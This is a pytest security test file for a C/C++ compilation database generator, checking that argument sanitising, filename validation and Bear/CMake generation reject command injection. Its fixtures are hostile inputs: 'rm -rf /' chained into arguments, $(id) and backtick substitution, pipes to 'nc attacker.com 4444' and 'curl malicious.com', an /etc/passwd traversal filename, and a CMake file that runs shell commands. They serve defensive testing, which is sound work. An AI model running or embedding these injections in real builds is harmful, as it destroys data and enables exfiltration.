"""
Command injection security tests for compilation database generator
"""

import pytest
import tempfile
import os
import json
from pathlib import Path

# Import the modules to test
from src.utils.compile_db_generator import CompileDBGenerator, sanitize_command_args
from tests.security.utils.security_test_helpers import SecurityTestCase, SecurityAssertions


@pytest.mark.security
@pytest.mark.command_injection
class TestCommandInjectionProtection:
    """Test command injection attack protection in compile commands"""

    def setup_method(self):
        """Set up test environment"""
        self.temp_dir = Path(tempfile.mkdtemp())
        self.generator = CompileDBGenerator(str(self.temp_dir))

        # Create test source files
        self.test_c_file = self.temp_dir / "test.c"
        self.test_cpp_file = self.temp_dir / "test.cpp"

        self.test_c_file.write_text("""
#include <stdio.h>
int main() {
    printf("Hello, World!\\n");
    return 0;
}
""")

        self.test_cpp_file.write_text("""
#include <iostream>
int main() {
    std::cout << "Hello, World!" << std::endl;
    return 0;
}
""")

    def teardown_method(self):
        """Clean up test environment"""
        SecurityTestCase.cleanup_temp_project(str(self.temp_dir))

    def test_sanitize_normal_args(self):
        """Test that normal command arguments are accepted"""
        normal_args = ["gcc", "-c", "test.c", "-o", "test.o", "-Wall", "-O2"]
        result = sanitize_command_args(normal_args)
        assert result == normal_args

    def test_sanitize_dangerous_chars(self):
        """Test that dangerous characters are filtered out"""
        dangerous_args = [
            "gcc",
            "-c",
            "test.c; rm -rf /",
            "-o",
            "test.o && echo 'pwned'",
            "`whoami`",
            "$(id)",
        ]

        result = sanitize_command_args(dangerous_args)
        # Dangerous arguments should be filtered out
        assert "test.c; rm -rf /" not in result
        assert "test.o && echo 'pwned'" not in result
        assert "`whoami`" not in result
        assert "$(id)" not in result

    @pytest.mark.parametrize("vector", SecurityTestCase.generate_command_injection_vectors())
    def test_command_injection_vectors(self, vector):
        """Test various command injection vectors"""
        args = ["gcc", "-c", vector]
        result = sanitize_command_args(args)

        # Should filter out dangerous arguments
        dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '\n', '\r']
        for char in dangerous_chars:
            if char in vector:
                # Check that no argument contains this dangerous character
                for arg in result:
                    assert char not in arg, f"Dangerous character {char} not filtered in {arg}"

    def test_safe_filename_validation(self):
        """Test that unsafe filenames are rejected"""
        unsafe_filenames = [
            "test.c; rm -rf /",
            "file && echo pwned.c",
            "normal.c$(id)",
            "test`whoami`.cpp",
            "../../../etc/passwd.c",
            "file|nc attacker.com 4444.c",
            "test\x00.c",
            "con.txt",  # Windows reserved name
            "test.c\n\r",
            "file\"quote.c",
            "file'apostrophe.c",
        ]

        for filename in unsafe_filenames:
            is_safe = self.generator._is_safe_filename(filename)
            assert not is_safe, f"Unsafe filename accepted: {filename}"

    def test_safe_filename_accepts_valid(self):
        """Test that valid filenames are accepted"""
        safe_filenames = [
            "test.c",
            "myfile.cpp",
            "source_file.cc",
            "header.hpp",
            "test_123.cxx",
            "MyClass.cpp",
            "file-with-dashes.c",
            "file_with_underscores.h",
        ]

        for filename in safe_filenames:
            is_safe = self.generator._is_safe_filename(filename)
            assert is_safe, f"Safe filename rejected: {filename}"

    def test_generate_simple_compile_db_normal(self):
        """Test normal compilation database generation"""
        source_files = [str(self.test_c_file), str(self.test_cpp_file)]
        result = self.generator.generate_simple_compile_db(source_files)

        assert result is True

        # Check generated compile_commands.json
        compile_commands_path = self.temp_dir / "compile_commands.json"
        assert compile_commands_path.exists()

        with open(compile_commands_path) as f:
            commands = json.load(f)

        assert len(commands) == 2

        # Verify commands are properly quoted
        for cmd in commands:
            command_str = cmd["command"]
            # Should not contain dangerous characters
            SecurityAssertions.assert_no_command_injection(command_str)

            # Should be properly quoted
            assert "'" in command_str or '"' in command_str

    def test_generate_simple_compile_db_with_injection(self):
        """Test compilation database generation with injection attempts"""
        # Create malicious source file names
        malicious_files = []

        for vector in SecurityTestCase.generate_command_injection_vectors()[:5]:  # Test a subset
            malicious_file = self.temp_dir / f"test{vector}.c"
            malicious_file.write_text("// Malicious filename test")
            malicious_files.append(str(malicious_file))

        # Add some safe files too
        source_files = [str(self.test_c_file)] + malicious_files

        result = self.generator.generate_simple_compile_db(source_files)

        # Should still succeed but filter out malicious files
        assert result is True

        # Check generated commands
        compile_commands_path = self.temp_dir / "compile_commands.json"
        with open(compile_commands_path) as f:
            commands = json.load(f)

        # Should only have safe files
        assert len(commands) >= 1  # At least the safe file

        for cmd in commands:
            # All commands should be safe
            SecurityAssertions.assert_no_command_injection(cmd["command"])

            # File names should be safe
            assert ";" not in cmd["file"]
            assert "&" not in cmd["file"]
            assert "|" not in cmd["file"]

    def test_build_command_with_special_chars(self):
        """Test building commands with special characters in legitimate use"""
        # These should be allowed as they're part of normal compilation
        edge_cases = [
            "test-file.c",  # hyphen
            "test_file.c",  # underscore
            "test123.c",  # numbers
            "TEST.C",  # uppercase
            "test.cpp",  # .cpp extension
        ]

        for filename in edge_cases:
            file_path = self.temp_dir / filename
            file_path.write_text("// Edge case test")

            is_safe = self.generator._is_safe_filename(filename)
            assert is_safe, f"Legitimate filename rejected: {filename}"

    def test_cmake_generation_security(self):
        """Test CMake generation doesn't execute malicious commands"""
        # Create a malicious CMakeLists.txt
        cmake_file = self.temp_dir / "CMakeLists.txt"
        cmake_file.write_text("""
cmake_minimum_required(VERSION 3.10)
project(Test)

# Try to execute system commands (should be sandboxed)
execute_process(COMMAND whoami)
execute_process(COMMAND "rm -rf /tmp/test")

add_executable(test test.c)
""")

        # Create build directory
        build_dir = self.temp_dir / "build"
        build_dir.mkdir()

        # The CMake generation should either fail or be sandboxed
        result = self.generator.generate_with_cmake("build")

        # We don't assert failure here as it depends on the environment
        # But we verify that no files outside the project were modified
        # (This is more of an integration test)

    def test_bear_generation_security(self):
        """Test Bear generation doesn't execute malicious commands"""
        malicious_commands = [
            ["make", ";", "rm", "-rf", "/"],
            ["gcc", "main.c", "&&", "nc", "attacker.com", "4444"],
            ["make", "|", "curl", "malicious.com"],
        ]

        for cmd in malicious_commands:
            # Bear should sanitize or reject these commands
            # In practice, Bear might fail but shouldn't execute the malicious parts
            try:
                result = self.generator.generate_with_bear(cmd)
                # If it succeeds, verify the output is safe
                if result:
                    compile_commands_path = self.temp_dir / "compile_commands.json"
                    if compile_commands_path.exists():
                        with open(compile_commands_path) as f:
                            commands = json.load(f)
                        for command in commands:
                            SecurityAssertions.assert_no_command_injection(command["command"])
            except Exception:
                # It's OK if it fails - better to be safe
                pass

    def test_empty_and_null_inputs(self):
        """Test handling of empty and null inputs"""
        empty_args = ["", None, "   ", "\x00", "\n\r"]
        result = sanitize_command_args(empty_args)

        # Should filter out empty/null arguments
        assert "" not in result
        assert None not in result
        assert "   " not in result
        assert "\x00" not in result

    def test_very_long_arguments(self):
        """Test handling of very long arguments"""
        long_arg = "a" * 10000
        args = ["gcc", "-c", "test.c", long_arg]

        result = sanitize_command_args(args)

        # Should either accept or reject based on policy
        if long_arg in result:
            # If accepted, ensure it's not too long
            assert all(len(arg) < 100000 for arg in result)

    def test_unicode_and_encoding_attacks(self):
        """Test Unicode and encoding-based injection attempts"""
        unicode_attacks = [
            "test.c\u202eroot",  # Right-to-left override
            "test.c\u0000malicious",  # Null character
            "test.c\xFF\xFE",  # Byte order mark
            "tēst.c",  # Unicode characters
            "テスト.c",  # Non-ASCII
        ]

        for attack in unicode_attacks:
            args = ["gcc", "-c", attack]
            result = sanitize_command_args(args)

            # Should handle Unicode safely
            if attack in result:
                # Verify it doesn't contain dangerous patterns after encoding
                SecurityAssertions.assert_no_command_injection(attack)

    def test_argument_list_injection(self):
        """Test injection through argument list manipulation"""
        dangerous_lists = [
            ["gcc", "-c", "test.c", "--", ";", "rm", "-rf", "/"],
            ["gcc", "-c", "test.c", "-D", "TEST; rm -rf /"],
            ["gcc", "-c", "test.c", "-include", "/etc/passwd"],
        ]

        for arg_list in dangerous_lists:
            result = sanitize_command_args(arg_list)

            # Should filter out dangerous arguments
            for arg in result:
                SecurityAssertions.assert_no_command_injection(arg)

    def test_security_assertion_helper(self):
        """Test security assertion helper"""
        safe_command = "gcc -c test.c -o test.o"
        SecurityAssertions.assert_no_command_injection(safe_command)

        # Should raise for dangerous commands
        dangerous_commands = [
            "gcc; rm -rf /",
            "gcc && whoami",
            "gcc | nc attacker.com 4444",
        ]

        for cmd in dangerous_commands:
            with pytest.raises(AssertionError):
                SecurityAssertions.assert_no_command_injection(cmd)